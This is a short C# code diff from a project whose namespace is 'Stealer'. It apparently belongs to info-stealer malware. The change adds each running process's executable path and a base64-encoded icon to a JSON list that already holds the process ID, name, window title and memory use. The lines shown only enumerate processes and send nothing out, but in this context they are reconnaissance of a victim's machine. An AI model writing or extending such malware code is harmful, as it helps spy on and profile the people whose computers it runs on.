@@ -345,7 +345,12 @@ namespace Stealer
                             string windowTitle = (p.MainWindowTitle ?? "").Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "").Replace("\n", "");
                             long mem = 0;
                             try { mem = p.WorkingSet64 / 1024 / 1024; } catch { }
-                            list.Add("{\"pid\":" + p.Id + ",\"name\":\"" + pName + "\",\"title\":\"" + windowTitle + "\",\"mem\":" + mem + "}");
+                            string exePath = "";
+                            try { exePath = p.MainModule?.FileName ?? ""; } catch { }
+                            string ico = "";
+                            if (!string.IsNullOrEmpty(exePath))
+                                ico = IconJson(GetIconBase64(exePath, false));
+                            list.Add("{\"pid\":" + p.Id + ",\"name\":\"" + pName + "\",\"title\":\"" + windowTitle + "\",\"mem\":" + mem + ico + "}");
                         }
                         catch { }
                     }
